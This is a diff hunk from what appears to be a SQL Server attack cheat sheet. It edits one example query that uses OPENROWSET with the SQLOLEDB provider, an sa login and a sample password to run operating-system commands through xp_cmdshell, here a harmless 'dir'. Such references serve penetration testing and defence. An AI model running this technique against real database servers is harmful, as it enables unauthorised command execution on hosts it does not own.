@@ -71,7 +71,7 @@ SELECT * FROM OPENROWSET(
 
 ```sql
 -- Using SQLOLEDB provider with command execution (legacy, may not work on newer versions)
-SELECT * FROM OPENROWSET('SQLOLEDB', '127.0.0.1';'sa';'p4ssw0rd', 'SET FMTONLY OFF execute master..xp_cmdshell "dir"');
+SELECT * FROM OPENROWSET('SQLOLEDB', 'Server=127.0.0.1;uid=sa;pwd=p4ssw0rd;', 'SET FMTONLY OFF execute master..xp_cmdshell "dir"');
 ```
 
 #### File System Access
